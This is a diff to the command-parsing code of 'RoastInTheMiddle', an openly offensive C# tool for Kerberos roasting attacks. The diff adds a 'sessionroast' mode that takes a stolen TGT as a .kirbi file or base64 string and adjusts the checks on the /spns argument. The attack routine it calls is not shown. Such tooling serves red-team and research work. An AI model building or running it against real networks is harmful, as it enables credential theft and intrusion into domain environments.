@@ -1,10 +1,12 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.IO;
 using System.Linq;
 using System.Net;
 using System.Text;
 using System.Threading.Tasks;
 using RoastInTheMiddle.Lib;
+using RoastInTheMiddle.Lib.Krb;
 
 namespace RoastInTheMiddle.Command
 {
@@ -12,7 +14,7 @@ namespace RoastInTheMiddle.Command
     {
         public static void Execute(Dictionary<string, string> arguments)
         {
-            List<string> spns = null;
+            List<string> spns = new List<string>();
             string listenIP = null;
             List<IPAddress> targets = null;
             List<IPAddress> dcIPs = null;
@@ -25,7 +27,6 @@ namespace RoastInTheMiddle.Command
 
             if (arguments.ContainsKey("/spns"))
             {
-                spns = new List<string>();
                 if (System.IO.File.Exists(arguments["/spns"]))
                 {
                     string fileContent = Encoding.UTF8.GetString(System.IO.File.ReadAllBytes(arguments["/spns"]));
@@ -46,9 +47,35 @@ namespace RoastInTheMiddle.Command
                 }
             }
 
-            if (spns == null)
+            if (Program.command.Equals("kerberoast") && spns.Count < 1)
             {
-                Console.WriteLine("[X] '/spns' argument is required to execute this application.");
+                Console.WriteLine("[X] '/spns' argument is required to execute this command.");
+                Usage.Print();
+                return;
+            }
+
+            if (arguments.ContainsKey("/tgt"))
+            {
+                string kirbi64 = arguments["/tgt"];
+                if (Helpers.IsBase64String(kirbi64))
+                {
+                    byte[] kirbiBytes = Convert.FromBase64String(kirbi64);
+                    Program.tgt = new KRB_CRED(kirbiBytes);
+                }
+                else if (File.Exists(kirbi64))
+                {
+                    byte[] kirbiBytes = File.ReadAllBytes(kirbi64);
+                    Program.tgt = new KRB_CRED(kirbiBytes);
+                }
+                else if (Program.command.Equals("sessionroast"))
+                {
+                    Console.WriteLine("[X] /tgt:X must either be a .kirbi file or a base64 encoded .kirbi");
+                    return;
+                }
+            }
+            else if (Program.command.Equals("sessionroast"))
+            {
+                Console.WriteLine("[X] the 'sessionroast' command requires the /tgt:X argument");
                 Usage.Print();
                 return;
             }
@@ -96,9 +123,9 @@ namespace RoastInTheMiddle.Command
 
             if (!string.IsNullOrWhiteSpace(listenIP))
             {
-                Console.WriteLine("[*] Starting RitM attack");
+                Console.WriteLine($"[*] Starting RitM {Program.command} attack");
                 RitM.Run(listenIP, targets, dcIPs, spns).Wait();
-                Console.WriteLine("[*] Finished RitM attack");
+                Console.WriteLine($"[*] Finished RitM {Program.command} attack");
             }
             else
             {
